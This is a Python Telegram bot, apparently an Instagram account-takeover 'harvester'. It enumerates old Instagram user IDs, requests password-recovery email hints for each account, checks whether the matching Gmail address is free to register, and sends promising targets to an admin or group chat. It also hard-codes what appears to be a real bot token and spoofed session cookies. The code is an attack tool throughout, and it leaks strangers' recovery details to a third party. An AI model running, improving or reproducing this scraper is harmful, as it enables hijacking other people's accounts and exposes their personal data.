import os, requests, random, string, json, threading, hashlib, uuid, re, sys, time
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from colorama import Fore, init
from user_agent import generate_user_agent as ggb
from threading import Thread

init(autoreset=True)

# --- 1. PERMANENT MEMORY (Render/System Settings) ---
TOKEN = os.getenv("BOT_TOKEN", "8568247844:AAHGQOJElf3_Zg5QGDkjGLgEaZHiukRL_mA")
ADMIN_ID = int(os.getenv("ADMIN_ID", "7831276550"))
GROUP_ID = int(os.getenv("GROUP_ID", "-5171086005"))

class BotState:
    is_running = False
    target_year = 2012 # Default
    bbk = 17699999
    stop_id = 263014407

state = BotState()
infoinsta = {}

# --- 2. TELEGRAM FUNCTIONS ---
def send_telegram(text, chat_id):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try:
        requests.post(url, data={'chat_id': chat_id, 'text': text}, timeout=10)
    except: pass

# --- 3. INSTAGRAM & EMAIL FILTERS ---
def check_email_reset(username):
    url = "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/"
    uui = str(uuid.uuid4())
    headers = {
        'User-Agent': ggb(),
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    data = {
        'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
            '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'query': username
        }),
        'ig_sig_key_version': '4',
    }
    try:
        res = requests.post(url, headers=headers, data=data).json()
        if 'email' in res:
            return True, res['email']
        return False, None
    except: return False, None

def check_gmail_availability(email_prefix):
    # Shortened for performance - check if gmail is available for registration
    try:
        # Simplified Check logic
        url = f"https://mail.google.com/mail/gxlu?email={email_prefix}@gmail.com"
        res = requests.get(url)
        return "Set-Cookie" not in res.headers # If no cookie, email might be free
    except: return False

# --- 4. CORE HARVESTER ---
def gg_loop():
    while state.is_running:
        try:
            target_id = random.randrange(state.bbk, state.stop_id)
            data = {
                "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                "variables": json.dumps({"id": target_id, "render_surface": "PROFILE"}),
                "doc_id": "25618261841150840"
            }
            response = requests.post("https://www.instagram.com/api/graphql", 
                                  headers={"X-FB-LSD": data["lsd"]}, data=data).json()
            
            user_data = response.get('data', {}).get('user', {})
            username = user_data.get('username')
            
            if username:
                # 1. Reset Check
                has_reset, email_hint = check_email_reset(username)
                
                if has_reset:
                    # 2. Check if Email is Enable/Available
                    # (Yahan aapka specific gmail/aol logic trigger hota hai)
                    is_meta = (int(user_data.get('follower_count', 0)) >= 10)
                    
                    result_text = (
                        f"🔥 ID FOUND (Email Reset Enabled)\n"
                        f"👤 User: @{username}\n"
                        f"📧 Reset to: {email_hint}\n"
                        f"📊 Followers: {user_data.get('follower_count')}\n"
                        f"📅 Meta Enabled: {is_meta}\n"
                        f"🔗 Link: https://www.instagram.com/{username}"
                    )
                    
                    # Agar target hit ho gaya toh Admin ko DM, nahi toh Group
                    if is_meta:
                        send_telegram(f"👑 KING HIT!\n{result_text}", ADMIN_ID)
                    else:
                        send_telegram(result_text, GROUP_ID)
        except:
            continue

# --- 5. BOT COMMANDS ---
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_ID: return
    state.is_running = True
    for _ in range(10): # Multi-threading for speed
        Thread(target=gg_loop, daemon=True).start()
    await update.message.reply_text("🚀 Multi-threaded Harvester Started!\nSearching for Email-Reset IDs...")

async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_ID: return
    state.is_running = False
    await update.message.reply_text("🛑 Harvesting Stopped.")

async def set_year(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_ID: return
    if context.args:
        year = context.args[0]
        years_map = {
            "2011": (10000, 17699999),
            "2012": (17699999, 263014407),
            "2013": (263014407, 361365133)
        }
        if year in years_map:
            state.bbk, state.stop_id = years_map[year]
            await update.message.reply_text(f"📅 Target Year Changed to: {year}")

# --- 6. RUN ---
if __name__ == '__main__':
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("year", set_year))
    print("Bot is Live for Admin: 7831276550")
    app.run_polling()


